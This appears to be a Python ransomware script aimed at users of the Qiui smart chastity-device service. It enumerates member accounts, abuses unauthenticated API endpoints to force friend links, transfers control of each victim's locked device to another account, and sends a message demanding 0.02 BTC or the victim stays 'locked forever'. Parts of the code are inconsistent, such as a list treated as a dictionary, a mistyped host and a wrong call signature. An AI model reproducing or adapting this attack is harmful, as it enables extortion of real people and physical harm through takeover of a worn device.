# list devices: http://www.qiuitoy.com/qiui/api/member/DeviceBinding/listAllByCode?memberCode=
# transfer authority: http://www.qiuitoy.com/qiui/api/member/DeviceBinding/settingKeeper?currentCode=&deviceCode=&memberCode=&memberPower=1&isAgree=0
# send messages: https://www.qiuitoy.com/qiui/api/member/MemberChat/sendMsgByCode?chatType=0&memberCode=&memberCodeOp=&chatContent=
# list messages: https://www.qiuitoy.com/qiui/api/member/MemberChat/listByPaging?token=null&currentPage=1&memberCode=&memberCodeOp=
from random import choice, randint
import requests
import pytz
from datetime import datetime, timedelta
import json

FIRST_MEMBER = None
MEMBERS = []
BITCOIN_ADDRESSES = []

ses = requests.session()

with open('laststolen.txt', 'r') as f:
    FIRST_MEMBER = int(f.readline())
with open('enum.txt') as f:
    for l in f:
        MEMBERS.append(l.strip().split(":"))
with open('bitcoin_addresses.txt') as f:
    for line in f:
        BITCOIN_ADDRESSES.append(line.strip())

def get_bitcoin_address():
    return choice(BITCOIN_ADDRESSES)

def fetch_devices(member_code):
    res = ses.get('http://www.qiuitoy.com/qiui/api/member/DeviceBinding/listAllByCode',
                       params={'memberCode': member_code}).json()
    if res['success'] == 1:
        return res['list']
    else:
        return []

def update_last_stolen(member_id):
    with open('laststolen.txt', 'w') as f:
        print(str(member_id), file=f)


def get_random_member(exclude):
    r = exclude
    while r[0] == exclude[0]:
        r = choice(MEMBERS)
    return r

def add_friend(first, second):
    # https://www.qiuitoy.com/qiui/api/member/MemberFriends/listNewMyFriends?token=null&memberCode=20201007080645913
    # https://www.qiuitoy.com/qiui/api/member/MemberFriends/addFriends?memberCode=&friendsCode=&friendsVerify=
    # {"arg":{"url":"https://www.qiuitoy.com/qiui/api/member/MemberFriends/passFriends?token=null","method":"POST","contentType":"application/x-www-form-urlencoded; charset=utf-8","cache":false,"timeout":30,"dataType":"json","data":{"values":{"id":120222,"friendsVerifyReplay":"tttt"}}},"cbId":4}

    print("sending friend request from %d:%s to %d:%s" % (first[0], first[1], second[0], second[1]))
    res = ses.get("https://www.qiuitoy.com/qiui/api/member/MemberFriends/addFriends", params={
        'memberCode': first[1],
        'friendsCode': second[1],
        'friendsVerify': 'i stole something from you :)',
        'signature': str(randint(0, 20000000))
    }).json()
    if res['success'] != 0:
        print("failed to send friend request: %s" % json.dumps(res))
        return

    print("fetching friend requests for %d:%s" % (second[0], second[1]))
    res = ses.get('http://www.qiuitoy.com/qiui/api/member/MemberFriends/listNewMyFriends', params={
        'memberCode': second[1]
    }).json()
    if res['success'] == 0:
        print("failed to fetch friend requests: %s" % res['message'])
        return
    request_id = None
    for request in res['list']:
        if request['memberCode'] == first[1]:
            request_id = request['id']
            break
    if request_id is None:
        print('failed to find friend request id')
        return

    print("accepting friend request with id ")
    res = ses.get('https://www.qiuitoy.com/qiui/api/member/MemberFriends/passFriends', params={'id': request_id}).json()
    if res['success'] == 0:
        print("failed to fetch friend requests: %s" % res['message'])
        return
    print('friend flow success')


def transfer_device(source, target, device):
    print('transfering authority over %s from %d:%s to %d:%s' % (
        device, source[0], source[1], target[0], target[1]))
    res = ses.get('https://wwww.qiuitoy.com/qiui/member/DeviceBinding/changeBinding', params={
        'memberCode': target[1],
        'deviceCode': device,
        'signature': str(randint(0, 20000000))
    },
    ).json()
    if res['success'] != 0:
        print('transfer failed')


def send_message(source, target, msg_body):
    print('msg %d:%s to %d:%s: %s' % (source[0], source[1], target[0], target[1], msg_body))
    res = ses.get('https://www.qiuitoy.com/qiui/member/MemberChat/sendMsgByCode', params={
        'chatType': '0',
        'memberCode': source[1],
        'memberCodeOp': target[1],
        'chatContent': msg_body,
        'signature': str(randint(0, 20000000))
    }).json()

    if res['success'] != 0:
        print('message failed')


def verify_transfer(target, device):
    res = ses.get('http://www.qiuitoy.com/qiui/api/member/DeviceBinding/listAllByCode',
                       params={'memberCode': target[1]}).json()
    if res['success'] == 1:
        for d in res['list']:
            if d['deviceCode'] == device['deviceCode']:
                print('transfer verified')
                return True
    print('transfer NOT verified')
    return False


def verify_message(source, target):
    res = ses.get('http://www.qiuitoy.com/qiui/api/member/MemberChat/listByPaging', params={
        'currentPage': '1',
        'memberCode': source[1],
        'memberCodeOp': target[1]
    }).json()

    if 'data' in res and len(res['data']) > 0:
        print('message verified: %s' % res['data'][-1]['chatContent'])
    else:
        print('message NOT verified')

def get_time_limit():
    time_limit = datetime.now(tz=pytz.utc) + timedelta(days=1, hours=13)
    return "Oct %d %s:00 UTC" % (time_limit.day, str(time_limit.hour).zfill(2))

def do_ransom(target):
    bitcoin_address = get_bitcoin_address()
    msg_body = "hahaha i have your cock now. send 0.02 BTC (Bitcoin) to %s by %s or you'll be locked forever" % (get_bitcoin_address(), get_time_limit())

    source = get_random_member(exclude=target)
    print('ransoming %d:%s from %d:%s' % (target[0], target[1], source[0], source[1]))
    print('BTC address: %s' % bitcoin_address)

    add_friend(source, target)
    for device in fetch_devices(target[1]):
        transfer_device(target, source, device)
        verify_transfer(target, device)
    send_message(source, target, msg_body)
    verify_message(source, target, msg_body)


def main():
    for m in MEMBERS.values():
        if m['member_id'] <= FIRST_MEMBER:
            continue

        do_ransom(m)
        update_last_stolen(m['member_id'])

if __name__ == '__main__':
    main()
